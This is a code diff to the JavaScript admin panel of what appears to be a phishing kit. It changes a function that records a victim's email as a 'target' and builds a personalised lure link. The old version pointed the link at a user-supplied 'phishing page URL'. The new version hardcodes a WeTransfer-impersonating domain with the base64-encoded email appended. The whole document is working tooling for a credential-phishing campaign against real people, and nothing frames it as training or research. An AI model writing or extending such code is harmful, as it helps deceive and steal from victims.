@@ -687,53 +687,47 @@
             updateDashboard();
         }
         
-        // Generate target link with encoded email
-        function generateTargetLink() {
-            const email = document.getElementById('targetEmail').value.trim();
-            const customMessage = document.getElementById('customMessage').value.trim();
-            const phishingPage = document.getElementById('phishingPage').value.trim();
-            
-            if (!email) {
-                showAlert('Please enter a valid email address', 'error');
-                return;
-            }
-            
-            if (!phishingPage) {
-                showAlert('Please enter a valid phishing page URL', 'error');
-                return;
-            }
-            
-            // Create target object
-            const target = {
-                id: generateId(),
-                email,
-                customMessage,
-                createdAt: new Date().toISOString(),
-                active: true,
-                linksGenerated: 1
-            };
-            
-            // Add to targets array
-            targets.push(target);
-            saveData();
-            
-            // Generate the link with encoded email
-            const encodedEmail = base64Encode(email);
-            const link = `${phishingPage}?email=${encodedEmail}`;
-            
-            // Display the link
-            linkText.textContent = link;
-            generatedLink.style.display = 'block';
-            
-            showAlert('Link generated successfully! This link will work on any device.');
-            
-            // Clear the form
-            document.getElementById('targetEmail').value = '';
-            document.getElementById('customMessage').value = '';
-            
-            // Update target list
-            renderTargetList();
-        }
+// In your admin panel, update the link generation function:
+function generateTargetLink() {
+    const email = document.getElementById('targetEmail').value.trim();
+    const customMessage = document.getElementById('customMessage').value.trim();
+    
+    if (!email) {
+        showAlert('Please enter a valid email address', 'error');
+        return;
+    }
+    
+    // Create target object
+    const target = {
+        id: generateId(),
+        email,
+        customMessage,
+        createdAt: new Date().toISOString(),
+        active: true,
+        linksGenerated: 1
+    };
+    
+    // Add to targets array
+    targets.push(target);
+    saveData();
+    
+    // Generate the link with encoded email (using base64 encoding)
+    const encodedEmail = btoa(encodeURIComponent(email));
+    const link = `https://wetransfer-omega.vercel.app/?email=${encodedEmail}`;
+    
+    // Display the link
+    linkText.textContent = link;
+    generatedLink.style.display = 'block';
+    
+    showAlert('Link generated successfully! This link will work on any device.');
+    
+    // Clear the form
+    document.getElementById('targetEmail').value = '';
+    document.getElementById('customMessage').value = '';
+    
+    // Update target list
+    renderTargetList();
+}
         
         // Copy target link to clipboard
         function copyTargetLink(target) {
